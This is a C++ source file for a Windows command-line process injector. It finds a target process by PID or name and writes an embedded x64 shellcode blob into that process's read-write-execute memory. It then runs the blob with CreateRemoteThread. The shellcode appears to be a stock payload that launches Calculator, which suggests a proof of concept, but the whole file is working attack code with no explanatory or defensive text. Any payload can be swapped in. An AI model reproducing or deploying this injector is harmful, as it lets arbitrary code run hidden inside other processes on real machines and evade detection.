#include <windows.h>
#include <string.h>
#include <tlhelp32.h>
#include <regex>

char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
    "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
    "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
    "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
    "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
    "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
    "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
    "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
    "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
    "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
    "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
    "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
    "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
    "\xd5\x63\x61\x6c\x63\x00";

unsigned int shellcodeSize = sizeof(shellcode);
const std::regex numberRegex("^[-+]?[0-9]*\\.?[0-9]+$");
const std::regex fileRegex("^[a-zA-Z0-9._-]+\\.[a-zA-Z0-9]+$");

// Function to get the Process ID (PID) by its name
int getPIDbyProcName(const char* procName) {
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnap, &pe32) != FALSE) {
        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE) {
            char procNameA[260];
            WideCharToMultiByte(CP_ACP, 0, pe32.szExeFile, -1, procNameA, 260, NULL, NULL);

            if (strcmp(procNameA, procName) == 0) {
                pid = pe32.th32ProcessID;
            }
        }

    }
    CloseHandle(hSnap);
    return pid;
}

int main(int argc, char* argv[]) 
{

    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    int pid = 0;

    if (argc < 2)
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
        printf("Specify args params\n");
        printf("Example: ProcessInjector <PID|FILENAME.EXTENSION>\n");
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        return 1;
    }


    std::string processString = argv[1];


    if (std::regex_match(processString, numberRegex))
    {
        pid = stoi(processString);
    }
    else if (std::regex_match(processString, fileRegex))
    {
        pid = getPIDbyProcName(processString.c_str());
    }
    else
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
        printf("Process Identifier does not have valid format\n");
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    if (pid == 0) 
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
        printf("Process not found\n");
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

        return 1;
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProc == NULL) {
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
        printf("Failed to open the process. Error code: %d\n", GetLastError());
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        return 1;
    }
    else 
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        printf("OpenProcess done\n");
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    LPVOID hAlloc = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (hAlloc == NULL) {
        SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        printf("Failed to allocate memory in the process. Error code: %d\n", GetLastError());
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        return 1;
    }
    else 
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        printf("VirtualAllocEx done\n");
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    if (!WriteProcessMemory(hProc, hAlloc, shellcode, shellcodeSize, NULL)) 
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
        printf("Failed to write the shellcode to the process. Error code: %d\n", GetLastError());
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        return 1;
    }
    else 
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        printf("WriteProcessMemory done\n");
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
    }

    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, NULL);
    if (hThread == NULL) {
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
        printf("Failed to create a remote thread. Error code: %d\n", GetLastError());
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
        return 1;
    }
    else
    {
        SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
        printf("CreateRemoteThread done\n");
        SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

        WaitForSingleObject(hThread, INFINITE);
        VirtualFreeEx(hProc, hAlloc, 0, 0x8000);
    }

    CloseHandle(hProc);

    SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
    printf("Injection done\n");
    SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);

    return 0;
}